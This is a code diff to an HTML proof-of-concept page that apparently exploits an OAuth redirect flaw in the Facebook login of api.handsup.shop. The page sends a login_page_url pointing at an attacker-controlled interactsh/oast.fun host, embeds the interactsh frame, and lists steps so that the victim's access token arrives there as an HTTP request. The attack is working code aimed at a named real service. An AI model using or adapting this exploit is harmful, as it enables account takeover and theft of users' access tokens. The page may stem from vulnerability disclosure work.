@@ -4,17 +4,19 @@
   <script>
     function initiateLogin() {
         const controlled_url = document.getElementById('controlled_url').value;
-        window.open('https://api.handsup.shop/auth/facebook?identity=seller&login_page_url=' + controlled_url);
+        window.open('https://api.handsup.shop/auth/facebook?identity=seller&login_page_url=https://' + controlled_url);
     }
   </script>
     <div id="token">
-      <h3>Wait for the complete loading of the interact.sh site.
-        Copy the url from the frame below to the input for the controlledUrl and keep the https:// at the start.
-        Press "Initiate Login with Facebook !".
-        Your access token will appear as an http request be retrieved there ...</h3>
+      <ol>
+        <li>Wait for the complete loading of the interact.sh site.</li>
+        <li>Copy the url from the frame below to the input for the controlledUrl.</li>
+        <li>Press "Initiate Login with Facebook !".</li>
+        <li>Your access token will appear as an http request be retrieved there ...</li>
+      </ol></h3>
     </div>
     <iframe src="https://app.interactsh.com/" width="100%" height="600px"></iframe>
 
-    Controlled URL : <input id="controlled_url" name="controlled_url" value="https://dmftkmghscwxjulluncucxcc46p8nfrk9.oast.fun" style="width:600px;"><button onclick="initiateLogin()">Initiate Login with Facebook !</button>
+    Controlled URL : <input id="controlled_url" name="controlled_url" placeholder="PASTE THE INTERACT URL HERE" style="width:600px;"><button onclick="initiateLogin()">Initiate Login with Facebook !</button>
 </body>
 </html>
